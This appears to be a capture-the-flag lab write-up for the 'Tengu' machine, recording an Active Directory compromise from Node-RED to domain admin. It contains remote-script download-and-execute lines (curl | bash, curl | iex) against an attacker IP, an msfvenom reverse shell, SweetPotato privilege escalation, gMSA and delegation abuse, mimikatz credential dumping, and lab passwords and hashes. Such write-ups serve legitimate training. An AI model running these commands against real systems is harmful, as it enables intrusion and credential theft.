# Tengu
![](images/tengu.png)


IPs: `10.10.180.37` `10.10.180.38` `10.10.180.39`

# Recon
Nmap:
10.10.180.37 DC.tengu.vl
```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

10.10.180.38 SQL.tengu.vl
```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

10.10.180.39
```
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
1880/tcp open  vsat-control
```

Looking at port 1880 it is running node-red

# Domain Foothold
What we can do is add an exec block and send a revshell:
```
curl  http://10.8.0.110:8080/shell.sh | bash
```

Looking at the home directory there are 2 localusers:
```
labadmin
nodered_svc
```

As this box can hit kerberos and ldap we can use chisel to set up a socks tunnel and see if the svc user is roastable.
```
local: ./chisel server --reverse --socks5
remote: ./chisel client 10.8.0.110:8080 R:socks
```

Going to kick off another nmap scan on the host, running this via a proxy will take forever.

SQL:
```
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

DC:
```
53/tcp   open  domain
88/tcp   open  kerberos
135/tcp  open  epmap
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd
593/tcp  open  unknown
636/tcp  open  ldaps
3389/tcp open  ms-wbt-server
```

Both users are not in ldap.

As nodered is able to connect to mssql it has to have the credentials somewhere.

```
nodered_svc@nodered:/opt/nodered/.node-red$ cat flows_cred.json 
{
"$": "7f5ab122acc2c24df1250a302916c1a6QT2eBZTys+V0xdb7c6VbXMXw2wbn/Q3r/ZcthJlrvm3XLJ8lSxiq+FAWF0l3Bg9zMaNgsELXPXfbKbJPxtjkD9ju+WJrZBRq/O40hpJzWoKASeD+w2o="
}
```

There is a decrypt script: `https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/` using this we can decrypt the file:
```
ls -la content/
-rw-r--r-- 1 eljay eljay  134 Oct 17 19:27 .config.runtime.json
-rw-r--r-- 1 eljay eljay  160 Oct 17 19:25 flows_cred.json
$ ./decrypt.sh content/
{"d237b4c16a396b9e":{"username":"nodered_connector","password":"DreamPuppyOverall25"}}
```

logging in and enumerating the db we find hashed creds for a domain user:
```
t2_m.winters:af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147
```

This hash cracks to `Tengu123`!

Using this account we can ssh in and su as root.

# Pivot to SQL
Going to run bloodhound.

Analyising the results shows a few interesting things; the linux server can read the gmsa password. This account can then be delegated for mssql service tickets.

With this in mind we can get system on the sql server.

Grabbing and decrypting the keytab file:
```
root@nodered:/etc# base64 krb5.keytab -w 0
BQIAAAA3AAEACFRFTkdVLlZMAAhOT0RFUkVEJAAAAAFmAnxfAgAXABDUIQ7i2wwDqjYRye+KTb9JAAAAAgAAADcAAQAIVEVOR1UuVkwACE5PREVSRUQkAAAAAWYCfF8CABEAED4EthuTn2EBjSwn1NwLOF8AAAACAAAARwABAAhURU5HVS5WTAAITk9ERVJFRCQAAAABZgJ8XwIAEgAgTOEcWAKJIn84+MwCJUViJJQdUl0eUlw1PqHh7IMTgJYAAAACAAAAPAACAAhURU5HVS5WTAAEaG9zdAAHTk9ERVJFRAAAAAFmAnxfAgAXABDUIQ7i2wwDqjYRye+KTb9JAAAAAgAAADwAAgAIVEVOR1UuVkwABGhvc3QAB05PREVSRUQAAAABZgJ8XwIAEQAQPgS2G5OfYQGNLCfU3As4XwAAAAIAAABMAAIACFRFTkdVLlZMAARob3N0AAdOT0RFUkVEAAAAAWYCfF8CABIAIEzhHFgCiSJ/OPjMAiVFYiSUHVJdHlJcNT6h4eyDE4CWAAAAAgAAAEkAAgAIVEVOR1UuVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AAdOT0RFUkVEAAAAAWYCfF8CABcAENQhDuLbDAOqNhHJ74pNv0kAAAACAAAASQACAAhURU5HVS5WTAARUmVzdHJpY3RlZEtyYkhvc3QAB05PREVSRUQAAAABZgJ8XwIAEQAQPgS2G5OfYQGNLCfU3As4XwAAAAIAAABZAAIACFRFTkdVLlZMABFSZXN0cmljdGVkS3JiSG9zdAAHTk9ERVJFRAAAAAFmAnxfAgASACBM4RxYAokifzj4zAIlRWIklB1SXR5SXDU+oeHsgxOAlgAAAAI=

python3 /opt/keytabextract.py krb.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : TENGU.VL
        SERVICE PRINCIPAL : NODERED$/
        NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f
```

Requesting the gmsa account and delegating a ticket for administrator

```
proxychains -q nxc ldap dc.tengu.vl -u nodered\$ -H d4210ee2db0c03aa3611c9ef8a4dbf49 --gmsa
SMB         224.0.0.1       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
LDAPS       224.0.0.1       636    DC               [+] tengu.vl\nodered$:d4210ee2db0c03aa3611c9ef8a4dbf49 
LDAPS       224.0.0.1       636    DC               [*] Getting GMSA Passwords
LDAPS       224.0.0.1       636    DC               Account: gMSA01$              NTLM: 876f2b245d0a3cb526cbed78eee39f65

proxychains getST.py -spn mssqlsvc/sql.tengu.vl -hashes :876f2b245d0a3cb526cbed78eee39f65 -impersonate Administrator tengu.vl/gMSA01\$
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@mssqlsvc_sql.tengu.vl@TENGU.VL.ccache

```

The login to mssql:
```
KRB5CCNAME=$(pwd)/administrator\@mssqlsvc_sql.tengu.vl\@TENGU.VL.ccache proxychains mssqlclient.py -k sql.tengu.vl
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  sql.tengu.vl:1433  ...  OK
[*] Encryption required, switching to TLS
[-] ERROR(SQL): Line 1: Login failed for user 'TENGU\administrator'.
```

Going to try again but with `t1.w_winters`
```
KRB5CCNAME=$(pwd)/t1_m.winters\@MSSQLSvc_SQL.tengu.vl\@TENGU.VL.ccache proxychains mssqlclient.py -k sql.tengu.vl
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  sql.tengu.vl:1433  ...  OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (TENGU\t1_m.winters  dbo@master)> 
```

We can also run xp_cmdshell which means rce! Checking the privileges of the user account shows that we also have seimpersonate which means we can get system.

Going to use a tcprevshell for the initial access then sweatpotato for the privesc:
```
SQL (TENGU\t1_m.winters  dbo@master)> xp_cmdshell powershell.exe -c "curl http://10.8.0.110:8080/shell.ps1 -UseBasicParsing | iex" 
```

Creating a quick revshell with msfvenom:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Then firing the exploit:
```
.\sweetpotato.exe -p C:\windows\tasks\shell.exe
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\windows\tasks\shell.exe
[+] Triggering notification on evil PIPE \\SQL/pipe/6c76cb7f-5149-4dbd-9b88-e9230608afa5
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!


ncat -lvnp 9001
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.180.38:56246.
Microsoft Windows [Version 10.0.20348.2340]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# Domain Admin
Time to dump everything with mimikatz:
```
.\mk.exe "vault::cred /patch" "exit"
.\mk.exe "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2} / <NULL>
UserName   : TENGU\T0_c.fowler
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : UntrimmedDisplaceModify25
Attributes : 0
```

winrm into the dc:
```
proxychains wmiexec.py t0_c.fowler:UntrimmedDisplaceModify25@dc.tengu.vl
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006e - STATUS_ACCOUNT_RESTRICTION - Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).
```

This just means we have to use kerberos auth:
```
proxychains getTGT.py tengu.vl/t0_c.fowler:UntrimmedDisplaceModify25
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in t0_c.fowler.ccache

KRB5CCNAME=$(pwd)/t0_c.fowler.ccache proxychains wmiexec.py t0_c.fowler@dc.tengu.vl -k -no-pass
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC
```

